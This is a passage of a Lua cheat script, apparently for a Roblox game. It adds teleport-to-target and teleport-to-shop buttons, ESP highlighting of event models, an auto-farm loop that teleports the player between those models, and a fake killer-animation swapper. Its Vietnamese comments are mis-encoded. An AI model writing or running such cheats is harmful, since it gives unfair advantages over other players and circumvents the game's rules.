4149 | 
4150 |         elseif aimMode == "Teleport" then
4151 |             local behindPos = hrp.Position - hrp.CFrame.LookVector * 3
4152 |             myRoot.CFrame = CFrame.new(behindPos, targetPos)
4153 |         end
4154 |     end
4155 | end)
4156 | end
4157 | 
4158 | 
4159 | -- Tabs.Event
4160 | 
4161 |     Tabs.Event:AddSection("Halloween")
4162 | 
4163 | 
4164 | do
4165 |     local Players = game:GetService("Players")
4166 |     local LocalPlayer = Players.LocalPlayer
4167 | 
4168 |     -- üì¶ N√∫t Teleport ri√™ng
4169 |     Tabs.Event:AddButton({
4170 |         Title = "TP to Shop",
4171 |         Description = "Teleport ƒë·∫øn khu Shop",
4172 |         Callback = function()
4173 |             local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
4174 |             local hrp = char:FindFirstChild("HumanoidRootPart")
4175 |             if hrp then
4176 |                 hrp.CFrame = CFrame.new(-3540.36, -392.73, 231.53)
4177 |             end
4178 |         end,
4179 |     })
4180 | end
4181 | 
4182 | 
4183 | local TeleportService = game:GetService("TeleportService")
4184 | local Players = game:GetService("Players")
4185 | 
4186 | Tabs.Event:AddButton({
4187 |     Title = "Get Skin Sixer",
4188 |     Callback = function()
4189 |         pcall(function()
4190 |             TeleportService:Teleport(139594300138069, Players.LocalPlayer)
4191 |         end)
4192 |     end
4193 | })
4194 | 
4195 | 
4196 | -- üíô 8. SUKKARS / EVENT ESP (v3.2: ch·∫°m vi·ªÅn s·∫Ω ·∫©n ESP)
4197 | -----------------------------------------------------
4198 | local RunService = game:GetService("RunService")
4199 | local Players = game:GetService("Players")
4200 | local LocalPlayer = Players.LocalPlayer
4201 | 
4202 | local allowedModels = {
4203 |     ["dumsek"] = true,
4204 |     ["toon dusek"] = true,
4205 |     ["dusek"] = true,
4206 |     ["umdum"] = true,
4207 |     ["doothsek"] = true,
4208 | }
4209 | 
4210 | local blockedCenter = Vector3.new(-3485.02, 4.48, 217.77)
4211 | local blockedRadius = 500
4212 | 
4213 | _G.ESPManager:RegisterType("Sukkars", Color3.fromRGB(0, 85, 255), function(obj)
4214 |     if not obj:IsA("Model") then return false end
4215 |     if not allowedModels[string.lower(obj.Name)] then return false end
4216 | 
4217 |     local part = obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")
4218 |     if not part then return false end
4219 | 
4220 |     local dist = (part.Position - blockedCenter).Magnitude
4221 |     if dist <= blockedRadius then return false end
4222 | 
4223 |     return true
4224 | end, false)
4225 | 
4226 | -- ‚ö° G·∫Øn .Touched 1 l·∫ßn duy nh·∫•t
4227 | local oldCreate = _G.ESPManager.Create
4228 | _G.ESPManager.Create = function(self, model, typeName)
4229 |     oldCreate(self, model, typeName)
4230 | 
4231 |     if typeName == "Sukkars" then
4232 |         local hrp = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
4233 |         if hrp and not hrp:FindFirstChild("_TouchedFlag") then
4234 |             local flag = Instance.new("BoolValue")
4235 |             flag.Name = "_TouchedFlag"
4236 |             flag.Parent = hrp
4237 | 
4238 |             hrp.Touched:Connect(function(hit)
4239 |                 local char = LocalPlayer.Character
4240 |                 if char and hit:IsDescendantOf(char) then
4241 |                     _G.ESPManager:Remove(model)
4242 |                 end
4243 |             end)
4244 |         end
4245 |     end
4246 | end
4247 | 
4248 | -- üí´ ·∫®n ESP khi ‚Äúch·∫°m vi·ªÅn‚Äù (c·ª± ly c·ª±c g·∫ßn)
4249 | task.spawn(function()
4250 |     while task.wait(0.15) do
4251 |         local char = LocalPlayer.Character
4252 |         local hrp = char and char:FindFirstChild("HumanoidRootPart")
4253 |         if not hrp then continue end
4254 | 
4255 |         for model, data in pairs(_G.ESPManager.Objects) do
4256 |             if data.type == "Sukkars" then
4257 |                 local part = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
4258 |                 if part then
4259 |                     local dist = (hrp.Position - part.Position).Magnitude
4260 |                     if dist <= 5 then -- üëà kho·∫£ng c√°ch ‚Äúch·∫°m vi·ªÅn‚Äù
4261 |                         _G.ESPManager:Remove(model)
4262 |                     elseif dist > 1200 then -- xa qu√° th√¨ d·ªçn ESP
4263 |                         _G.ESPManager:Remove(model)
4264 |                     end
4265 |                 else
4266 |                     _G.ESPManager:Remove(model)
4267 |                 end
4268 |             end
4269 |         end
4270 |     end
4271 | end)
4272 | 
4273 | Tabs.Event:AddToggle("ESPSukkarsToggle", {
4274 |     Title = "ESP Sukkars",
4275 |     Default = false,
4276 | }):OnChanged(function(state)
4277 |     _G.ESPManager:SetEnabled("Sukkars", state)
4278 | end)
4279 | 
4280 | 
4281 | 
4282 | -- üß≠ Danh s√°ch model c·∫ßn teleport t·ªõi
4283 | local TargetNames = {
4284 |     "dumsek",
4285 |     "toon dusek",
4286 |     "umdum",
4287 |     "dusek",
4288 |     "doothsek",
4289 | }
4290 | 
4291 | -- ‚öôÔ∏è C√†i ƒë·∫∑t
4292 | local ScanInterval = 0.5
4293 | local TeleportDelay = 0.25
4294 | local HeightSafe = 5
4295 | local IgnoreCenter = Vector3.new(-3485.02, 4.48, 217.77)
4296 | local IgnoreRadius = 500
4297 | 
4298 | -- ‚ö° Bi·∫øn ƒëi·ªÅu khi·ªÉn
4299 | local autoTeleport = false
4300 | local visitedModels = {}
4301 | local currentTarget = nil
4302 | 
4303 | -- === SERVICES ===
4304 | local Players = game:GetService("Players")
4305 | local LocalPlayer = Players.LocalPlayer
4306 | 
4307 | -- === H√ÄM H·ªñ TR·ª¢ ===
4308 | local function getHumanoid()
4309 | 	local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
4310 | 	return char:FindFirstChildOfClass("Humanoid"), char
4311 | end
4312 | 
4313 | local function getModelCFrame(model)
4314 | 	if not model or not model:IsDescendantOf(workspace) then return end
4315 | 	local part = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
4316 | 	if part then
4317 | 		return part.CFrame
4318 | 	elseif model.GetPivot then
4319 | 		local ok, pivot = pcall(function()
4320 | 			return model:GetPivot()
4321 | 		end)
4322 | 		if ok then return pivot end
4323 | 	end
4324 | end
4325 | 
4326 | local function isValidModel(model)
4327 | 	if not model or not model:IsDescendantOf(workspace) then
4328 | 		return false
4329 | 	end
4330 | 	for _, name in ipairs(TargetNames) do
4331 | 		if model.Name:lower() == name:lower() then
4332 | 			local cf = getModelCFrame(model)
4333 | 			if cf then
4334 | 				local pos = cf.Position
4335 | 				if (pos - IgnoreCenter).Magnitude > IgnoreRadius then
4336 | 					return true
4337 | 				end
4338 | 			end
4339 | 		end
4340 | 	end
4341 | 	return false
4342 | end
4343 | 
4344 | -- === T√åM C√ÅC MODEL H·ª¢P L·ªÜ ===
4345 | local function findTargets()
4346 | 	local list = {}
4347 | 	for _, obj in ipairs(workspace:GetDescendants()) do
4348 | 		if obj:IsA("Model") and isValidModel(obj) then
4349 | 			table.insert(list, obj)
4350 | 		end
4351 | 	end
4352 | 	return list
4353 | end
4354 | 
4355 | -- === KI·ªÇM TRA NH√ÇN V·∫¨T ƒêANG CH·∫†M MODEL HI·ªÜN T·∫†I ===
4356 | local function isTouchingTarget(target)
4357 | 	if not target or not target:IsDescendantOf(workspace) then
4358 | 		return false
4359 | 	end
4360 | 	local char = LocalPlayer.Character
4361 | 	if not char then return false end
4362 | 
4363 | 	local hrp = char:FindFirstChild("HumanoidRootPart")
4364 | 	if not hrp then return false end
4365 | 
4366 | 	local targetPart = target:FindFirstChild("HumanoidRootPart") or target.PrimaryPart or target:FindFirstChildWhichIsA("BasePart")
4367 | 	if not targetPart then return false end
4368 | 
4369 | 	local dist = (hrp.Position - targetPart.Position).Magnitude
4370 | 	return dist <= 6
4371 | end
4372 | 
4373 | -- === TELEPORT SANG MODEL TI·∫æP THEO ===
4374 | local function teleportToNext()
4375 | 	local humanoid, char = getHumanoid()
4376 | 	local hrp = char and char:FindFirstChild("HumanoidRootPart")
4377 | 	if not hrp then return end
4378 | 
4379 | 	-- D·ªçn d·∫πp model ƒë√£ bi·∫øn m·∫•t kh·ªèi danh s√°ch
4380 | 	for m in pairs(visitedModels) do
4381 | 		if not m:IsDescendantOf(workspace) then
4382 | 			visitedModels[m] = nil
4383 | 		end
4384 | 	end
4385 | 
4386 | 	-- L·∫•y danh s√°ch h·ª£p l·ªá
4387 | 	local allTargets = findTargets()
4388 | 	local available = {}
4389 | 	for _, m in ipairs(allTargets) do
4390 | 		if not visitedModels[m] and m:IsDescendantOf(workspace) then
4391 | 			table.insert(available, m)
4392 | 		end
4393 | 	end
4394 | 
4395 | 	-- N·∫øu h·∫øt m·ª•c ti√™u th√¨ reset visited ƒë·ªÉ qu√©t l·∫°i
4396 | 	if #available == 0 then
4397 | 		table.clear(visitedModels)
4398 | 		return
4399 | 	end
4400 | 
4401 | 	-- Ch·ªçn model g·∫ßn nh·∫•t
4402 | 	table.sort(available, function(a, b)
4403 | 		local pa = getModelCFrame(a).Position
4404 | 		local pb = getModelCFrame(b).Position
4405 | 		return (hrp.Position - pa).Magnitude < (hrp.Position - pb).Magnitude
4406 | 	end)
4407 | 
4408 | 	local nextTarget = available[1]
4409 | 	if nextTarget then
4410 | 		local cf = getModelCFrame(nextTarget)
4411 | 		if cf then
4412 | 			local pos = cf.Position
4413 | 			if pos.Y < -10 then
4414 | 				pos = Vector3.new(pos.X, HeightSafe, pos.Z)
4415 | 			end
4416 | 			hrp.CFrame = CFrame.new(pos + Vector3.new(0, 3, 0))
4417 | 			currentTarget = nextTarget
4418 | 		end
4419 | 	end
4420 | end
4421 | 
4422 | -- === V√íNG CH√çNH ===
4423 | task.spawn(function()
4424 | 	while task.wait(ScanInterval) do
4425 | 		if autoTeleport and LocalPlayer.Character then
4426 | 			-- n·∫øu target hi·ªán t·∫°i bi·∫øn m·∫•t, b·ªè qua v√† chuy·ªÉn model kh√°c
4427 | 			if currentTarget and not currentTarget:IsDescendantOf(workspace) then
4428 | 				currentTarget = nil
4429 | 				task.wait(TeleportDelay)
4430 | 				teleportToNext()
4431 | 			elseif currentTarget and isTouchingTarget(currentTarget) then
4432 | 				visitedModels[currentTarget] = true
4433 | 				task.wait(TeleportDelay)
4434 | 				teleportToNext()
4435 | 			elseif not currentTarget then
4436 | 				teleportToNext()
4437 | 			end
4438 | 		end
4439 | 	end
4440 | end)
4441 | 
4442 | -- === TOGGLE GUI ===
4443 | Tabs.Event:AddToggle("AutoFarmSukkars", {
4444 | 	Title = "Auto Farm Sukkars",
4445 | 	Default = false,
4446 | 	Callback = function(state)
4447 | 		autoTeleport = state
4448 | 		if not state then
4449 | 			currentTarget = nil
4450 | 			table.clear(visitedModels)
4451 | 		end
4452 | 	end,
4453 | })
4454 | 
4455 | 
4456 | -- Tabs.Custom
4457 | 
4458 | 
4459 | 
4460 | 
4461 |     Tabs.Custom:AddSection("Animation")
4462 | 
4463 | --// Fake Killers Anim System (hardened)
4464 | do
4465 |     local Players = game:GetService("Players")
4466 |     local RunService = game:GetService("RunService")
4467 |     local UserInputService = game:GetService("UserInputService")
4468 |     local ReplicatedStorage = game:GetService("ReplicatedStorage")
4469 | 
4470 |     local player = Players.LocalPlayer
4471 | 
4472 |     -- th·ª≠ require sprint module (n·∫øu c√≥)
4473 |     local sprintModule
4474 |     pcall(function()
4475 |         sprintModule = require(ReplicatedStorage:WaitForChild("Systems").Character.Game.Sprinting)
4476 |     end)
4477 | 
4478 |     -- ==============================
4479 |     -- üü¢ D·ªÆ LI·ªÜU KILLERS + SKINS (ch·ªâ s·ª≠a ·ªü ƒë√¢y)
4480 |     -- ==============================
4481 |     local KillersData = {
4482 |         ["Shasher"] = {
4483 |             ["Default"] = {
4484 |                 Idle = "rbxassetid://116050994905421",
4485 |                 Walk = "rbxassetid://93622022596108",
4486 |                 Run  = "rbxassetid://93054787145505",
4487 |             },
4488 |             ["Pursuer"] = {
4489 |                 Idle = "rbxassetid://94895464960972",
4490 |                 Walk = "rbxassetid://100206079439305",
4491 |                 Run  = "rbxassetid://138660433982140",
4492 |             },
4493 |             ["subject_0"] = {
4494 |                 Idle = "rbxassetid://14301056458",
4495 |                 Walk = "rbxassetid://122325883800612",
4496 |                 Run  = "rbxassetid://97248175252805",
4497 |             }
4498 |         },
4499 |         ["Coolkidd"] = {
4500 |             ["Default"] = {
4501 |                 Idle = "rbxassetid://18885903667",
4502 |                 Walk = "rbxassetid://18885906143",
4503 |                 Run  = "rbxassetid://96571077893813",
4504 |             }
4505 |         },
4506 |         ["John Doe"] = {
4507 |             ["Default"] = {
4508 |                 Idle = "rbxassetid://105880087711722",
4509 |                 Walk = "rbxassetid://81193817424328",
4510 |                 Run  = "rbxassetid://132653655520682",
4511 |             },
4512 |             ["Shadow"] = {
4513 |                 Idle = "rbxassetid://00000000001",
4514 |                 Walk = "rbxassetid://00000000002",
4515 |                 Run  = "rbxassetid://00000000003",
4516 |             }
4517 |         },
4518 |         ["Noli"] = {
4519 |             ["Default"] = {
4520 |                 Idle = "rbxassetid://93841120533318",
4521 |                 Walk = "rbxassetid://109700476007435",
4522 |                 Run  = "rbxassetid://117451341682452",
4523 |             }
4524 |         },
4525 |         ["1x1x1x1"] = {
4526 |             ["Default"] = {
4527 |                 Idle = "rbxassetid://138754221537146",
4528 |                 Walk = "rbxassetid://131235528875091",
4529 |                 Run  = "rbxassetid://106485518413331",
4530 |             },
4531 |             ["Hacklord [Old]"] = {
4532 |                 Idle = "rbxassetid://82241652784826",
4533 |                 Walk = "rbxassetid://119242164490314",
4534 |                 Run  = "rbxassetid://92430101129682",
4535 |             },
4536 |             ["Hacklord [New]"] = {
4537 |                 Idle = "rbxassetid://106131211773069",
4538 |                 Walk = "rbxassetid://119112338263474",
4539 |                 Run  = "rbxassetid://85339002634979",
4540 |             }
4541 |         },
4542 |         ["Herobrine"] = {
4543 |             ["Default"] = {
4544 |                 Idle = "rbxassetid://107799240559806",
4545 |                 Walk = "rbxassetid://89380107485006",
4546 |                 Run  = "rbxassetid://134157363854022",
4547 |             }
4548 |         },
4549 |         ["Gubby"] = {
4550 |             ["Default"] = {
4551 |                 Idle = "rbxassetid://88333702239259",
4552 |                 Walk = "rbxassetid://115244584291581",
4553 |                 Run  = "rbxassetid://115244584291581",
4554 |             }
4555 |         },
4556 |         ["Sancho"] = {
4557 |             ["Default"] = {
4558 |                 Idle = "rbxassetid://115073581864188",
4559 |                 Walk = "rbxassetid://95213748170889",
4560 |                 Run  = "rbxassetid://75409814098993",
4561 |             }
4562 |         },
4563 |         ["Erlking"] = {
4564 |             ["Default"] = {
4565 |                 Idle = "rbxassetid://93727662665079",
4566 |                 Walk = "rbxassetid://97625643261790",
4567 |                 Run  = "rbxassetid://119357938208454",
4568 |             }
4569 |         },
4570 |         ["Sukuna"] = {
4571 |             ["Default"] = {
4572 |                 Idle = "rbxassetid://115268929362938",
4573 |                 Walk = "rbxassetid://123678890237669",
4574 |                 Run  = "rbxassetid://132086389849889",
4575 |                 Music = "rbxassetid://73595818073606" -- üÜï nh·∫°c ƒë·∫∑c bi·ªát
4576 |             }
4577 |         }
4578 |     }
4579 |     -- ==============================
4580 | 
4581 |     -- state
4582 |     local enabled = false
4583 |     local selectedKiller = "Shasher"
4584 |     local selectedSkin = "Default"
4585 |     local character, humanoid, animator
4586 |     local idleAnim, walkAnim, runAnim
4587 |     local idleTrack, walkTrack, runTrack
4588 |     local _isSprinting = false
4589 |     local musicSound -- üÜï bi·∫øn gi·ªØ Sound object
4590 | 
4591 |     -- conn
4592 |     local runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn = nil, nil, nil, nil, nil
4593 |     local heartbeatAccumulator = 0
4594 |     local HEARTBEAT_CHECK_INTERVAL = 0.12
4595 | 
4596 |     -- utility
4597 |     local function stopAndClearTracks()
4598 |         for _, track in ipairs({idleTrack, walkTrack, runTrack}) do
4599 |             if track then pcall(function() track:Stop() end) end
4600 |         end
4601 |         idleTrack, walkTrack, runTrack = nil, nil, nil
4602 |     end
4603 | 
4604 |     local function stopMusic()
4605 |         if musicSound then
4606 |             pcall(function()
4607 |                 musicSound:Stop()
4608 |                 musicSound:Destroy()
4609 |             end)
4610 |             musicSound = nil
4611 |         end
4612 |     end
4613 | 
4614 |     local function playMusicIfSukuna(set)
4615 |         stopMusic()
4616 |         if selectedKiller == "Sukuna" and set and set.Music then
4617 |             local sound = Instance.new("Sound")
4618 |             sound.SoundId = set.Music
4619 |             sound.Looped = true
4620 |             sound.Volume = 2
4621 |             sound.Parent = workspace
4622 |             sound:Play()
4623 |             musicSound = sound
4624 |         end
4625 |     end
4626 | 
4627 |     local function disconnectListeners()
4628 |         for _, c in ipairs({runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn}) do
4629 |             if c then pcall(function() c:Disconnect() end) end
4630 |         end
4631 |         runningConn, heartbeatConn, characterRemovingConn, inputBeganConn, inputEndedConn = nil, nil, nil, nil, nil
4632 |     end
4633 | 
4634 |     local function cleanupCurrentCharacter()
4635 |         stopAndClearTracks()
4636 |         stopMusic()
4637 |         disconnectListeners()
4638 |         animator, humanoid, character = nil, nil, nil
4639 |     end
4640 | 
4641 |     -- load anim objects theo killer + skin
4642 |     local function loadAnimObjects(killer, skin)
4643 |         local killerTable = KillersData[killer]
4644 |         if not killerTable then
4645 |             warn("loadAnimObjects: killer kh√¥ng t·ªìn t·∫°i:", tostring(killer))
4646 |             return
4647 |         end
4648 |         local set = killerTable[skin or "Default"] or killerTable["Default"]
4649 |         if not set then return end
4650 | 
4651 |         idleAnim, walkAnim, runAnim = Instance.new("Animation"), Instance.new("Animation"), Instance.new("Animation")
4652 |         idleAnim.Name, walkAnim.Name, runAnim.Name = "IdleAnim", "WalkAnim", "RunAnim"
4653 |         idleAnim.AnimationId, walkAnim.AnimationId, runAnim.AnimationId = set.Idle, set.Walk, set.Run
4654 | 
4655 |         playMusicIfSukuna(set) -- üÜï check ph√°t nh·∫°c n·∫øu l√† Sukuna
4656 |     end
4657 | 
4658 |     -- play anim
4659 |     local function playAnim(animObj, trackType)
4660 |         if not animator then return end
4661 | 
4662 |         if trackType ~= "Idle" and idleTrack then pcall(function() idleTrack:Stop() end) idleTrack=nil end
4663 |         if trackType ~= "Walk" and walkTrack then pcall(function() walkTrack:Stop() end) walkTrack=nil end
4664 |         if trackType ~= "Run" and runTrack then pcall(function() runTrack:Stop() end) runTrack=nil end
4665 | 
4666 |         local track
4667 |         if trackType=="Idle" and not idleTrack then idleTrack = animator:LoadAnimation(idleAnim) track=idleTrack
4668 |         elseif trackType=="Walk" and not walkTrack then walkTrack = animator:LoadAnimation(walkAnim) track=walkTrack
4669 |         elseif trackType=="Run" and not runTrack then runTrack = animator:LoadAnimation(runAnim) track=runTrack
4670 |         else track = (trackType=="Idle" and idleTrack) or (trackType=="Walk" and walkTrack) or runTrack end
4671 | 
4672 |         if track and not track.IsPlaying then pcall(function() track:Play() end) end
4673 |     end
4674 | 
4675 |     local function playIdle() playAnim(idleAnim,"Idle") end
4676 |     local function playWalk() playAnim(walkAnim,"Walk") end
4677 |     local function playRun() playAnim(runAnim,"Run") end
4678 | 
4679 |     -- update state
4680 |     local function updateMovementState()
4681 |         if not enabled or not character then return end
4682 |         local moving=false
4683 |         if humanoid and humanoid.MoveDirection then
4684 |             moving = humanoid.MoveDirection.Magnitude>0
4685 |             if not moving then
4686 |                 local root = character:FindFirstChild("HumanoidRootPart") or character.PrimaryPart
4687 |                 if root and root.Velocity.Magnitude>1 then moving=true end
4688 |             end
4689 |         end
4690 |         if moving then
4691 |             local sprintingNow = (sprintModule and sprintModule.IsSprinting) or _isSprinting
4692 |             if sprintingNow then playRun() else playWalk() end
4693 |         else
4694 |             playIdle()
4695 |         end
4696 |     end
4697 | 
4698 |     -- listeners
4699 |     local function setupMovementListeners()
4700 |         disconnectListeners()
4701 |         inputBeganConn = UserInputService.InputBegan:Connect(function(input,gp) if gp then return end if input.KeyCode==Enum.KeyCode.LeftShift then _isSprinting=true end end)
4702 |         inputEndedConn = UserInputService.InputEnded:Connect(function(input,gp) if gp then return end if input.KeyCode==Enum.KeyCode.LeftShift then _isSprinting=false end end)
4703 | 
4704 |         if humanoid and humanoid.Running then
4705 |             runningConn = humanoid.Running:Connect(function(speed) if not enabled then return end if speed>0 then updateMovementState() else playIdle() end end)
4706 |         else
4707 |             heartbeatAccumulator=0
4708 |             heartbeatConn = RunService.Heartbeat:Connect(function(dt)
4709 |                 if not enabled or not character then return end
4710 |                 heartbeatAccumulator+=dt
4711 |                 if heartbeatAccumulator>=HEARTBEAT_CHECK_INTERVAL then
4712 |                     heartbeatAccumulator=0
4713 |                     updateMovementState()
4714 |                 end
4715 |             end)
4716 |         end
4717 |     end
4718 | 
4719 |     -- bind character
4720 |     local function onCharacterBound(char)
4721 |         cleanupCurrentCharacter()
4722 |         character=char
4723 |         humanoid=char:FindFirstChildOfClass("Humanoid") or char:FindFirstChildOfClass("AnimationController")
4724 |         if humanoid then
4725 |             animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
4726 |         end
4727 |         characterRemovingConn = char.AncestryChanged:Connect(function(_,parent) if not parent then cleanupCurrentCharacter() end end)
4728 |         if enabled then
4729 |             loadAnimObjects(selectedKiller, selectedSkin)
4730 |             setupMovementListeners()
4731 |             updateMovementState()
4732 |         end
4733 |     end
4734 | 
4735 |     player.CharacterAdded:Connect(onCharacterBound)
4736 |     if player.Character then onCharacterBound(player.Character) end
4737 | 
4738 |     -- ===== UI =====
4739 |     local killerNames = {}
4740 |     for name,_ in pairs(KillersData) do table.insert(killerNames, name) end
4741 |     table.sort(killerNames)
4742 | 
4743 |     local SkinDropdown -- khai b√°o tr∆∞·ªõc
4744 | 
4745 |     -- dropdown ch√≠nh (Killers)
4746 |     local killerDropdown = Tabs.Custom:AddDropdown("ChooseKillersDropdown", {
4747 |         Title = "Choose Killers",
4748 |         Values = killerNames,
4749 |         Default = selectedKiller,
4750 |         Multi = false,
4751 |         Callback = function(value)
4752 |             local ok, err = pcall(function()
4753 |                 selectedKiller = value
4754 |                 selectedSkin = "Default"
4755 | 
4756 |                 local skins = {}
4757 |                 local t = KillersData[selectedKiller] or {}
4758 |                 for sName,_ in pairs(t) do table.insert(skins, sName) end
4759 |                 if #skins == 0 then skins = {"Default"} end
4760 |                 table.sort(skins)
4761 | 
4762 |                 if SkinDropdown and type(SkinDropdown.SetValues)=="function" and type(SkinDropdown.SetValue)=="function" then
4763 |                     SkinDropdown:SetValues(skins)
4764 |                     pcall(function() SkinDropdown:SetValue(skins[1] or "Default") end)
4765 |                 end
4766 | 
4767 |                 if enabled and player.Character then
4768 |                     loadAnimObjects(selectedKiller, selectedSkin)
4769 |                     stopAndClearTracks()
4770 |                     updateMovementState()
4771 |                 else
4772 |                     stopMusic()
4773 |                 end
4774 |             end)
4775 |             if not ok then warn("ChooseKillersDropdown callback error:", err) end
4776 |         end
4777 |     })
4778 | 
4779 |     -- dropdown Skin (n·∫±m d∆∞·ªõi Killer)
4780 |     SkinDropdown = Tabs.Custom:AddDropdown("ChooseSkinDropdown", {
4781 |         Title = "Choose Skin",
4782 |         Values = {"Default"},
4783 |         Default = "Default",
4784 |         Multi = false,
4785 |         Callback = function(value)
4786 |             local ok, err = pcall(function()
4787 |                 selectedSkin = value
4788 |                 if enabled and player.Character then
4789 |                     loadAnimObjects(selectedKiller, selectedSkin)
4790 |                     stopAndClearTracks()
4791 |                     updateMovementState()
4792 |                 else
4793 |                     stopMusic()
4794 |                 end
4795 |             end)
4796 |             if not ok then warn("SkinDropdown callback error:", err) end
4797 |         end
4798 |     })
4799 | 
4800 |     -- toggle fake killers
4801 |     Tabs.Custom:AddToggle("FakeKillersToggle", {
4802 |         Title = "Fake Killers",
4803 |         Default = false,
4804 |         Callback = function(state)
4805 |             local ok, err = pcall(function()
4806 |                 enabled = state
4807 |                 if enabled then
4808 |                     if player.Character then
4809 |                         loadAnimObjects(selectedKiller, selectedSkin)
4810 |                         onCharacterBound(player.Character)
4811 |                     end
4812 |                 else
4813 |                     stopAndClearTracks()
4814 |                     disconnectListeners()
4815 |                     stopMusic()
4816 |                 end
4817 |             end)
4818 |             if not ok then warn("FakeKillersToggle callback error:", err) end
4819 |         end
4820 |     })
4821 | end
4822 | 
4823 | 
4824 | 
4825 |     Tabs.Custom:AddSection("Skill")
4826 | 
4827 | 
4828 | do
4829 | -- LocalScript (StarterPlayerScripts)
4830 | 
4831 | local Players = game:GetService("Players")
4832 | local UserInputService = game:GetService("UserInputService")
4833 | local player = Players.LocalPlayer
4834 | local playerGui = player:WaitForChild("PlayerGui")
4835 | 
4836 | -- ‚ö° Config
4837 | local BUTTON_SIZE = 48
4838 | local FramesLocked = true
4839 | local screenGui
4840 | local createdFrames = {}
4841 | 
4842 | -- d·ªØ li·ªáu c√°c n√∫t
4843 | local buttonsData = {
4844 |     {Name = "Btn1", AnimationId = "135853087227453", PlayMusic = true, MusicId = "81361259756089", ImageId = "134210378382767"},
4845 |     {Name = "Btn2", AnimationId = "99784586201997", PlayMusic = false, ImageId = "134210378382767"},
4846 |     {Name = "Btn3", AnimationId = "121162477402224", PlayMusic = true, MusicId = "120185817748858", ImageId = "85785826985052"},
4847 |     {Name = "Btn4", AnimationId = "101816924844805", PlayMusic = true, MusicId = "88406027536494", ImageId = "85785826985052"},
4848 | }
4849 | 
4850 | -- v·ªã tr√≠ ban ƒë·∫ßu
4851 | local startPositions = {
4852 |     UDim2.new(0, 80, 0, 200),
4853 |     UDim2.new(0, 140, 0, 200),
4854 |     UDim2.new(0, 200, 0, 200),
4855 |     UDim2.new(0, 260, 0, 200),
4856 | }
4857 | 
4858 | -- üåü Drag Module
4859 | local function makeDraggable(frame)
4860 |     local dragging, dragStart, startPos
4861 | 
4862 |     frame.InputBegan:Connect(function(input)
4863 |         if not FramesLocked and (input.UserInputType == Enum.UserInputType.MouseButton1 
4864 |             or input.UserInputType == Enum.UserInputType.Touch) then
4865 |             dragging = true
4866 |             dragStart = input.Position
4867 |             startPos = frame.Position
4868 | 
4869 |             input.Changed:Connect(function()
4870 |                 if input.UserInputState == Enum.UserInputState.End then
4871 |                     dragging = false
4872 |                 end
4873 |             end)
4874 |         end
4875 |     end)
4876 | 
4877 |     UserInputService.InputChanged:Connect(function(input)
4878 |         if not FramesLocked and dragging and 
4879 |             (input.UserInputType == Enum.UserInputType.MouseMovement 
4880 |             or input.UserInputType == Enum.UserInputType.Touch) then
4881 |             local delta = input.Position - dragStart
4882 |             frame.Position = UDim2.new(
4883 |                 startPos.X.Scale,
4884 |                 startPos.X.Offset + delta.X,
4885 |                 startPos.Y.Scale,
4886 |                 startPos.Y.Offset + delta.Y
4887 |             )
4888 |         end
4889 |     end)
4890 | end
4891 | 
4892 | -- üîπ GUI container
4893 | screenGui = Instance.new("ScreenGui")
4894 | screenGui.Name = "CircleButtonsGUI"
4895 | screenGui.ResetOnSpawn = false
4896 | screenGui.IgnoreGuiInset = true
4897 | screenGui.Enabled = false
4898 | screenGui.Parent = playerGui
4899 | 
4900 | -- üîπ H√†m t·∫°o frame + button
4901 | local function createFrameWithButton(data, pos)
4902 |     local frame = Instance.new("Frame")
4903 |     frame.Name = data.Name .. "_Frame"
4904 |     frame.Size = UDim2.new(0, BUTTON_SIZE, 0, BUTTON_SIZE)
4905 |     frame.Position = pos
4906 |     frame.BackgroundTransparency = 1
4907 |     frame.ZIndex = 1
4908 |     frame.Parent = screenGui
4909 |     frame.Active = true
4910 | 
4911 |     -- bo tr√≤n frame
4912 |     local frameCorner = Instance.new("UICorner")
4913 |     frameCorner.CornerRadius = UDim.new(1, 0)
4914 |     frameCorner.Parent = frame
4915 | 
4916 |     local btn = Instance.new("ImageButton")
4917 |     btn.Name = data.Name
4918 |     btn.Size = UDim2.new(1, 0, 1, 0)
4919 |     btn.BackgroundTransparency = 1
4920 |     btn.Image = "rbxassetid://" .. data.ImageId
4921 |     btn.ZIndex = 2
4922 |     btn.Parent = frame
4923 |     btn.ScaleType = Enum.ScaleType.Fit -- gi·ªØ t·ªâ l·ªá ·∫£nh
4924 | 
4925 |     -- bo tr√≤n n√∫t
4926 |     local corner = Instance.new("UICorner")
4927 |     corner.CornerRadius = UDim.new(1, 0)
4928 |     corner.Parent = btn
4929 | 
4930 |     -- click ch·∫°y animation/nh·∫°c
4931 |     btn.MouseButton1Click:Connect(function()
4932 |         if FramesLocked then
4933 |             local char = player.Character or player.CharacterAdded:Wait()
4934 |             local humanoid = char:FindFirstChildOfClass("Humanoid")
4935 |             if not humanoid then return end
4936 | 
4937 |             local animator = humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)
4938 |             local anim = Instance.new("Animation")
4939 |             anim.AnimationId = "rbxassetid://" .. data.AnimationId
4940 |             local track = animator:LoadAnimation(anim)
4941 |             track:Play()
4942 | 
4943 |             if data.PlayMusic and data.MusicId then
4944 |                 local sound = Instance.new("Sound")
4945 |                 sound.SoundId = "rbxassetid://" .. data.MusicId
4946 |                 sound.Volume = 1
4947 |                 sound.Parent = char:FindFirstChild("Head") or playerGui
4948 |                 sound:Play()
4949 |                 sound.Ended:Connect(function() sound:Destroy() end)
4950 |             end
4951 |         end
4952 |     end)
4953 | 
4954 |     makeDraggable(frame)
4955 | 
4956 |     btn.Visible = FramesLocked
4957 |     frame.BackgroundTransparency = FramesLocked and 1 or 0.3
4958 | 
4959 |     table.insert(createdFrames, frame)
4960 | end
4961 | 
4962 | -- t·∫°o n√∫t
4963 | for i, d in ipairs(buttonsData) do
4964 |     createFrameWithButton(d, startPositions[i])
4965 | end
4966 | 
4967 | -- üåü T√≠ch h·ª£p Toggle + Input
